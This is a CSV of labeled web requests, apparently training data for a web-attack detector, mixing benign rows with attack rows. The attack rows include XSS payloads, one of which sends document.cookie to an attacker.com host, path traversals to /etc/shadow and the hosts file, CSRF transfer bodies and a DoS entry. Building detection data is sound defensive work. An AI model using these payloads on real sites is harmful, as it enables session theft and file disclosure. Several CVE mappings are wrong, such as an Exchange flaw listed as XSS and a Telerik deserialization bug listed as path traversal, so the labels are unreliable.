timestamp,attack_type,cve,cvss_score,severity,payload_snippet,label,status_code
2026-05-21T12:13:45.370378,xss,CVE-2020-11022,6.1,MEDIUM,<svg><script>alert&#40;1&#41;</script></svg>,1,N/A
2026-05-21T12:13:49.624252,xss,CVE-2020-11022,6.1,MEDIUM,<svg><script>alert&#40;1&#41;</script></svg>,1,N/A
2026-05-21T12:13:53.636061,xss,CVE-2019-11358,6.1,MEDIUM,<script>Object.prototype.nodeName='SCRIPT'</script>,1,N/A
2026-05-21T12:13:57.838856,xss,CVE-2021-26855,9.8,CRITICAL,<script>fetch('https://attacker.com/?c='+document.cookie)</script>,1,N/A
2026-05-21T12:14:00.126233,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:14:02.559963,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:14:05.204908,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:14:08.259714,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:14:11.072319,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:14:13.683541,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:14:17.427341,path_traversal,CVE-2021-41773,9.8,CRITICAL,/../../../etc/shadow,1,N/A
2026-05-21T12:14:19.694905,path_traversal,CVE-2021-41773,9.8,CRITICAL,/../../../etc/shadow,1,N/A
2026-05-21T12:14:20.022155,path_traversal,CVE-2019-18935,9.8,CRITICAL,..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,1,N/A
2026-05-21T12:14:22.225756,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:14:25.154963,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:14:27.666329,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:14:30.506602,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:14:33.082103,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:14:36.052408,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:14:39.440219,csrf,OWASP-A01,6.5,MEDIUM,"{""name"": ""Victim"", ""email"": ""victim879@mail.com"", ""amount"": 683, ""action"": ""tran",1,201
2026-05-21T12:14:41.887068,csrf,OWASP-A01,6.5,MEDIUM,"{""name"": ""Victim"", ""email"": ""victim188@mail.com"", ""amount"": 3080, ""action"": ""tra",1,201
2026-05-21T12:14:44.361155,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:14:47.041858,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:14:49.298464,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:14:52.197892,benign,N/A,0,NONE,normal_data,0,201
2026-05-21T12:14:55.265146,benign,N/A,0,NONE,normal_orders,0,N/A
2026-05-21T12:14:57.675255,benign,N/A,0,NONE,normal_products,0,N/A
2026-05-21T12:15:00.330177,benign,N/A,0,NONE,normal_users,0,N/A
2026-05-21T12:15:04.820426,dos,N/A,0,HIGH,large_payload,1,201
